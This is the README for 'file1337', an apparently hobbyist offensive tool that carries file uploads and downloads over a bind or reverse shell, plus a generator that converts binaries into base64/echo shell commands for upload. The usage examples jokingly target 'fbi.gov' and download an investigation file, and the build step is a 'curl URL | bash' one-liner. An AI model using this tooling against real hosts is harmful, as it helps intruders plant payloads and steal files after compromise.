# file1337

`file1337` might help if you have a bind or reverse shell working and want to transfer files without any additional servers involved. This experimental tool does nothing special and doesn't do that well.

`generator.py` may help if you can execute shell commands on the target programatically, but have no access to `stdin`. It's most likely possible to upload arbitrary file through a series of shell commands which it generates.

## file1337

For bind shell:
```
file1337 d|u [-d driver] [-o offset] HOST PORT source_file [target_file = basename]
```

For reverse shell:
```
file1337 d|u [-d driver] [-o offset] -l listen_port source_file [target_file = basename]
```

Target needs to be compatible with at least one driver (default is `shell`):
* `shell` - requires... a shell... and `echo`, `stat`, `chmod`, `cat` and `dd` (`dd` only for download).
* `shell_nodd` - same as above but doesn't use `dd`, and doesn't support offsets
* `perl` - tested on latest version which is often not the case, but doesn't use any fancy features.

`file1337` tries to preserve basic file permission bits, so no need to `chmod +x` after uploading binaries.

### This sucks
Of course it does, since it's written by zb3. But `file1337` also:
* Doesn't support files larger than 4GB.
* Supports only files, not directories.
* Gives no feedback. Files may be uploaded partially, not at all, or contain garbage at the end. `file1337` is too primitive to handle these cases. How should it handle network connection loss  when expecting a reverse shell? It's out of scope. Only a warning will appear.

### Example

So you have a bindshell running on `fbi.gov` on port `3243` and you want to upload `me.txt` as `/fbi/mostwanted/zb3.txt` on the target. The command is:
```
file1337 u fbi.gov 3243 me.txt /fbi/mostwanted/zb3.txt
```


To listen for a reverse shell on port `22633`, use:
```
file1337 u -l 22633 me.txt /fbi/mostwanted/zb3.txt
```

Downloading files works similar way:
```
file1337 d fbi.gov 3243 /fbi/investigation_info/zb3.txt
```

If it turns out only `X` bytes were transfered, repeat the previous command with `-o X` to resume the transfer (you must supply that value manually). `shell_nodd` driver doesn't support doing that.

### Compiling

It can compile itself, see [this gist](https://gist.github.com/zb3/74125fb1af82c2474e2e4a8e4704cb96)
```
curl URL | bash
```
will compile into `file1337` file and execute (show help).


## generator.py

If you can only execute shell commands, and have no access to their `stdin` (which is quite common) there may be multiple ways to upload binary files via shell commands which this script generates.

Again, there are "drivers":
* `shell` - just `cat BASE64 | base64 -di >> target`
* `shell_en` - just `echo -en ESCAPED >> target`
* `perl` - uses base64 too


Since command length is usually limited (around 130KB), it can generate more than one command. By default the limit is 130KB, but it may be much less on the target.

See `gentest.py` for (short circuit) usage example.